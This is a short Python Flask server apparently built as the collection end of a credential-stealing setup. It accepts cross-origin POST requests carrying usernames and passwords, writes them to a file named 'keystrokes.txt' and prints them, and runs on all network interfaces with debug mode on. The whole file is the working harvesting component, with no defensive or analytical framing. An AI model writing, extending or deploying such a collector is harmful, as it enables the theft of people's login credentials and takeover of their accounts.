from flask import Flask, request
from flask_cors import CORS
import logging

app = Flask(__name__)
CORS(app)

# Setup logging
logging.basicConfig(
    filename="keystrokes.txt",
    level=logging.INFO,
    format="%(asctime)s - [DATA]: %(message)s",
)

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    username = data.get("username", "Unknown")
    password = data.get("password", "Unknown")

    logging.info(f"Username: {username} | Password: {password}")
    print(f"Logged Username: {username}, Password: {password}")  # For debugging

    return "Logged", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
